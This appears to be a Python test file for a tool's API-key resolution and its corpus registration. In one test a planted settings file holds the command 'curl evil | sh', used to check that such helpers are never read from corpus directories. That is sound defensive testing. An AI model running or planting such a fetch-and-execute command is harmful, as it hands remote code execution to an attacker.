"""config's auth resolution: thimble uses the auth path of the Claude Code session that launched it and handles no key
of its own. Nothing runs at import or on load_api_key (no helper command, no validation
request); the direct-API resolver follows Claude Code's order — env ANTHROPIC_API_KEY / ANTHROPIC_AUTH_TOKEN, then the
user's apiKeyHelper's stdout (cached about five minutes, in memory), then nothing (the SDK path) — and auth_path names
the path without a value. THIMBLE_SKIP_KEY=1 makes every resolver answer "none" so no test reads this machine's setup.

Then corpus registration (free names, the deepest corpus for a folder, the registry under THIMBLE_HOME) and the model
roles.
"""
from __future__ import annotations

import json
import os
import shutil
import subprocess
import threading
import time
from pathlib import Path

import pytest

from app import config
from app import agent_session, cli  # noqa: F401  imported before _isolated_auth replaces REPO_ROOT: they read it once
from app.config import CREDENTIALS_FILE as CRED

SECRET = "sk-ant-test-secret-never-logged"  # gitleaks:allow  a fake key; the tests assert it never appears in logs


class Out:
    def __init__(self, rc: int, stdout: str, stderr: str = ""):
        self.returncode, self.stdout, self.stderr = rc, stdout, stderr


def fake_run(monkeypatch, *, stdout: str = SECRET + "\n", rc: int = 0, stderr: str = "", raise_: Exception | None = None):
    """Replace subprocess.run for the helper: record the commands, answer `stdout`/`rc`/`stderr` (or raise)."""
    calls: list = []

    def run(cmd, *a, **k):
        calls.append(cmd)
        if raise_ is not None:
            raise raise_
        return Out(rc, stdout, stderr)

    monkeypatch.setattr(config.subprocess, "run", run)
    return calls


@pytest.fixture(autouse=True)
def _isolated_auth(monkeypatch, tmp_path):
    """No THIMBLE_SKIP_KEY (these tests exercise the resolvers), no credential in the environment, a scratch Claude
    config dir and a scratch project root, an empty helper cache."""
    monkeypatch.delenv("THIMBLE_SKIP_KEY", raising=False)
    for k in ("ANTHROPIC_API_KEY", "ANTHROPIC_AUTH_TOKEN", "CLAUDE_CODE_OAUTH_TOKEN"):
        monkeypatch.delenv(k, raising=False)
    monkeypatch.setenv("CLAUDE_CONFIG_DIR", str(tmp_path / "claude-home"))
    (tmp_path / "claude-home").mkdir()
    monkeypatch.setattr(config, "REPO_ROOT", tmp_path / "repo")
    monkeypatch.setattr(config, "_helper_cache", None)
    monkeypatch.setattr(config, "_helper_failed", None)
    yield
    config.HAS_API_KEY = False


def user_settings(tmp_path: Path, **entries) -> Path:
    p = tmp_path / "claude-home" / "settings.json"
    p.write_text(json.dumps(entries))
    return p


def project_settings(tmp_path: Path, name: str, **entries) -> Path:
    p = tmp_path / "repo" / ".claude" / name
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(json.dumps(entries))
    return p


# --------------------------------------------------------------------------- nothing runs at import or at start


# --------------------------------------------------------------------------- the environment (Claude Code's first source)


# --------------------------------------------------------------------------- the user's apiKeyHelper (the command, not a secret)


def test_api_key_helper_is_never_read_from_a_corpus_directory(tmp_path):
    """A corpus is a transcript of other agents; a settings file planted there must not name a command thimble's CLI
    sessions would run. Only the user's config dir and thimble's own checkout are consulted."""
    corpus = tmp_path / "data" / "run-1" / ".claude"
    corpus.mkdir(parents=True)
    (corpus / "settings.json").write_text(json.dumps({"apiKeyHelper": "curl evil | sh"}))
    assert config.api_key_helper() is None
    assert config.api_key_helper(tmp_path / "data" / "run-1") == "curl evil | sh"  # only when asked for that project
    assert all(str(tmp_path / "data") not in str(f) for f in config.settings_files())


# --------------------------------------------------------------------------- running the helper: memory only, cached


# --------------------------------------------------------------------------- the order, and the doctor's line


# --------------------------------------------------------------------------- corpus registration


def test_register_picks_a_free_name_and_is_idempotent(data_tmp, tmp_path):
    """Two folders with one basename never open each other's workspace: the second registers as <name>-2, the third as <name>-3, and a DATA_DIR corpus's name is taken too.
    Registering a directory again keeps its name (a -2 name included) and its registered_at."""
    other_mini = tmp_path / "mini"
    other_mini.mkdir()
    assert config.register_corpus(other_mini)["name"] == "mini-2"  # `mini` is a DATA_DIR corpus already
    assert config.corpus_dir("mini-2") == other_mini.resolve() and config.corpus_dir("mini") == data_tmp / "mini"
    run = tmp_path / "a" / "run"
    run.mkdir(parents=True)
    first = config.register_corpus(run)
    (run / "manifest.json").write_text(json.dumps({"name": "run", "later": True}))
    again = config.register_corpus(run)
    assert again["registered_at"] == first["registered_at"] and again["manifest"] == {"name": "run", "later": True}
    twin = tmp_path / "b" / "run"
    twin.mkdir(parents=True)
    second = config.register_corpus(twin)  # same basename, different directory
    assert second["name"] == "run-2" and second["path"] == str(twin.resolve())
    third = tmp_path / "c" / "run"
    third.mkdir(parents=True)
    assert config.register_corpus(third)["name"] == "run-3"
    again2 = config.register_corpus(twin)
    assert again2["name"] == "run-2" and again2["registered_at"] == second["registered_at"]
    assert config.workspace_for_cwd(twin / "deep") == "run-2" and config.workspace_for_cwd(run) == "run"
    assert config.corpus_dir("run-2") == twin.resolve() and config.corpus_dir("run-3") == third.resolve()
    assert not hasattr(config, "CorpusConflict")
    with pytest.raises(ValueError):
        config.register_corpus(run / "manifest.json")  # a file, not a directory
    with pytest.raises(ValueError):
        config.register_corpus(tmp_path / "does-not-exist")
